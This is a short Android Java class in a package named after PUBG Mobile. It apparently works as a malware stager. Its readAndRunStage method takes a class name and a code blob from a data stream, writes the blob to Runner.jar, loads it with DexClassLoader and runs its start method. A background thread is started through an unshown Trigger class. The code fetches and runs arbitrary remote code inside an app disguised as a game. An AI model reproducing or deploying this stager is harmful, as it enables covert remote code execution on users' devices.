package com.pubg.imobile;

import android.content.Context;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.lang.reflect.InvocationTargetException;

import dalvik.system.DexClassLoader;

public class Cheetah {
    static String[] params;

    public static class T extends Thread {
        @Override
        public void run() {
            try {
                Cheetah.main(null);
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }
    }

    public static void a(Context context) {
        d(context.getFilesDir().toString());
    }

    public static void b() {
        new T().start();
    }

    public static void d(String path) {
        params = new String[]{path};
        b();
    }

    public static void readAndRunStage(DataInputStream input, DataOutputStream output, String[] args) throws IOException, NoSuchMethodException, IllegalAccessException, InstantiationException, InvocationTargetException, ClassNotFoundException {
        String dirPath = args[0];
        String jarFilePath = dirPath + File.separatorChar + "Runner.jar";

        int coreSize1 = input.readInt();
        byte[] coreData1 = new byte[coreSize1];
        input.readFully(coreData1);

        String className = new String(coreData1);

        int coreSize2 = input.readInt();
        byte[] coreData2 = new byte[coreSize2];
        input.readFully(coreData2);

        File jarFile = new File(jarFilePath);


        FileOutputStream fileOutputStream = new FileOutputStream(jarFile);
        fileOutputStream.write(coreData2);
        fileOutputStream.flush();
        fileOutputStream.close();

        Class<?> loadedClass;
        loadedClass = new DexClassLoader(jarFilePath, dirPath, dirPath, Cheetah.class.getClassLoader()).loadClass(className);

        assert loadedClass != null;
        Object stageInstance = loadedClass.newInstance();

        loadedClass.getMethod("start", DataInputStream.class, OutputStream.class, String[].class)
                .invoke(stageInstance, input, output, args);

    }

    public static void main(String[] args) {
        Trigger.W(args);
    }

}
